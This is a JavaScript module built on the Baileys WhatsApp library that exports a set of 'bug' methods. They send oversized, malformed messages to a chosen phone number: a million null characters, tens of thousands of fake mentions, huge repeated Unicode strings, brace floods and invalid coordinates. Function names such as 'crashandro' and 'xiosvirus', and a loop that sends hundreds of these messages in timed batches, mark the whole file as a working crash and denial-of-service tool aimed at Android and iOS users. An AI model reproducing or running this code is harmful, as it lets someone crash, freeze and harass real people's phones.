import { generateWAMessageFromContent, proto } from "baileys";
import crypto from "crypto";

const cihuy = Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==", "base64");

async function protocolbug6(sock, target, mention) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: "VALORES ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "TREDICT INVICTUS",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9741,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "trigger newsletter ( @tamainfinity )",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        type: 25
                    },
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                            content: undefined
                        }
                    ]
                }
            }
        }, {});
    }
}

async function protocolbug5(sock, target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "C O S M O ✦ H A D E S",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function trashprotocol(sock, target, mention) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@rizxvelzinfinity",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗̸̷̷̷̋͜͢͜͢͠͡͡𝐕𝐄𝐋𝐙-‣"
                        }
                    },
                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "false" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function TrashLocIOS(sock, XS) {
    try {
        const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "🩸⃟⃨〫⃰‣ ⁖𝐗͢𝐒 𝐌͢Θ𝐃𝐃͢Σ𝐑𝐒 ‣—" + "𖣂".repeat(15000),
            address: " 🍧⃟༑⌁⃰𝐃𝐞ͯ𝐬𝐭𝐫͢𝐮𝐢𝐝𝐨𝐫 𝐗͜𝐒ཀ͜͡🍨" + "𖣂".repeat(5000),
            url: `https://www.xnxx.${"𖣂".repeat(25000)}.com`,
        }
        const msg = generateWAMessageFromContent(XS, {
            viewOnceMessage: {
                message: { locationMessage }
            }
        }, {});
        await sock.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [XS],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: XS },
                        content: undefined
                    }]
                }]
            }]
        });
    } catch (err) {
        console.error(err);
    }
}

async function XiosVirus(sock, X) {
    try {
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "𝗫𝗦 𝗠𝗢𝗗𝗗𝗘𝗥𝗦" + "𖣂".repeat(15000),
            address: "🩸⃟༑⌁⃰𝐓𝐡͢𝐚𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🦠" + "𖣂".repeat(5000),
            url: `https://api-than-xs.${"𖣂".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        let extendMsg = {
            extendedTextMessage: {
                text: "JustinXSatanic",
                matchedText: "https://t.me/thanror",
                description: "ios turbo - 1080".repeat(15000),
                title: "—!s thann xs".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: cihuy,
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: extendMsg
            }
        }, {});
        await sock.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [X],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: X },
                        content: undefined
                    }]
                }]
            }]
        });
        await sock.relayMessage('status@broadcast', msg2.message, {
            messageId: msg2.key.id,
            statusJidList: [X],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: X },
                        content: undefined
                    }]
                }]
            }]
        });
    } catch (err) {
        console.error(err);
    }
};

async function SqLException(sock, isTarget) {
    const payload = {
        interactiveMessage: {
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: cihuy
            },
            contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                conversionSource: "porn",
                conversionData: crypto.randomBytes(16),
                conversionDelaySeconds: 9999,
                forwardingScore: 999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "StX Revolution 👾",
                    mediaType: "IMAGE",
                    jpegThumbnail: cihuy,
                    caption: "SOLO EXPOSED"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: -99999,
                ephemeralSettingTimestamp: Date.now(),
                ephemeralSharedSecret: crypto.randomBytes(16),
                entryPointConversionSource: "WhatsaApp",
                entryPointConversionApp: "WhatsApp",
                actionLink: {
                    url: "t.me/tamainfinity",
                    buttonTitle: "action_button"
                },
                disappearingMode: {
                    initiator: 1,
                    trigger: 2,
                    initiatorDeviceJid: isTarget,
                    initiatedByMe: true
                },
                groupSubject: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                parentGroupJid: "120363370626418572@g.us",
                trustBannerType: "X",
                trustBannerAction: 99999,
                isSampled: true,
                externalAdReply: {
                    title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
                    mediaType: 2,
                    renderLargerThumbnail: false,
                    showAdAttribution: false,
                    containsAutoReply: false,
                    body: "© T-Яyuichi",
                    thumbnail: cihuy,
                    sourceUrl: "t.me/tamainfinity",
                    sourceId: "9T7A4M1A",
                    ctwaClid: "ctwaClid",
                    ref: "ref",
                    clickToWhatsappCall: true,
                    ctaPayload: "ctaPayload",
                    disableNudge: true,
                    originalImageUrl: null
                },
                featureEligibilities: {
                    cannotBeReactedTo: true,
                    cannotBeRanked: true,
                    canRequestFeedback: true
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363321780343299@newsletter",
                    serverMessageId: 1,
                    newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: "FnX Exposed"
                },
                statusAttributionType: 2,
                utm: {
                    utmSource: "XSource",
                    utmCampaign: "XCampaign"
                }
            },
            body: {
                text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }
                ]
            }
        }
    };

    const message = await (async () => {
        try {
            return generateWAMessageFromContent(
                isTarget,
                payload,
                {}
            );
        } catch (e) {
            console.error("Error generating message payload:", e);
        }
    })();

    if (message) {
        await sock.relayMessage(
            isTarget,
            message.message,
            {
                messageId: message.key.id,
                participant: isTarget
            }
        );
    }
}

async function nasgor(sock, target) {
    await sock.relayMessage(target, {
        interactiveMessage: {
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: cihuy,
                title: "D | 7eppeli-Exploration"
            },
            contextInfo: {
                participant: "13135550002@s.whatsapp.net",
                remoteJid: "status@broadcast",
                conversionSource: "Wa.me/stickerpack/d7y",
                conversionData: Math.random(),
                conversionDelaySeconds: 250208,
                isForwarded: true,
                forwardingScore: 250208,
                forwardNewsletterMessageInfo: {
                    newsletterName: "D | 7eppeli-Exploration",
                    newsletterJid: "1@newsletter",
                    serverMessageId: 1
                },
                quotedAd: {
                    caption: "D | 7eppeli-Exploration",
                    advertiserName: "D | 7eppeli-Exploration",
                    mediaType: "VIDEO"
                },
                placeKeyHolder: {
                    fromMe: false,
                    remoteJid: "0@s.whatsapp.net",
                    id: "YUKJAL1234"
                },
                expiration: -250208,
                ephemeralSettingTimestamp: 99999,
                ephemeralSharedSecret: 999,
                entryPointConversionSource: "Whatsapp.com",
                entryPointConversionApp: "Whatsapp.com",
                actionLink: {
                    url: "Wa.me/stickerpack/d7y",
                    buttonTitle: "D | 7eppeli-Exploration"
                }
            },
            nativeFlowMessage: {
                messageParamaJson: "{".repeat(9000),
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                    }
                ],
                messageParamsJson: "}".repeat(9000)
            }
        }
    }, {
        participant: target
    })
}

async function iosOver(sock, XS) {
    const durationHours = 24;
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log(`Success! Total terkirim: ${batch - 1}`);
            return;
        }

        try {
            if (count < 200) {
                await Promise.all([
                    XiosVirus(sock, XS),
                    TrashLocIOS(sock, XS)
                ]);
                console.log(`${count + 1}/200 🍷`);
                count++;
                setTimeout(sendNext, 100);
            } else {
                console.log(`Success Send Bug to ${XS} (${batch})`);
                if (batch < maxBatches) {
                    console.log(`JustinXSatanic — 2025`);
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 5 * 60 * 1000);
                } else {
                    console.log(`${maxBatches} batches completed`);
                }
            }
        } catch (error) {
            console.error(`❌ Error saat mengirim: ${error.message}`);
            setTimeout(sendNext, 700);
        }
    };
    sendNext();
}

export const bugMethods = {
    "iosinvis": (sock, target) => iosOver(sock, target),
    "crashandro": (sock, target) => nasgor(sock, target),
    "forceandro": (sock, target) => nasgor(sock, target),
    "sqlexception": (sock, target) => SqLException(sock, target),
    "trashloc": (sock, target) => TrashLocIOS(sock, target),
    "xiosvirus": (sock, target) => XiosVirus(sock, target),
    "delay-invis": async (sock, target, mention) => {
        await protocolbug6(sock, target, mention);
        await protocolbug5(sock, target, mention);
        await trashprotocol(sock, target, mention);
    }
};
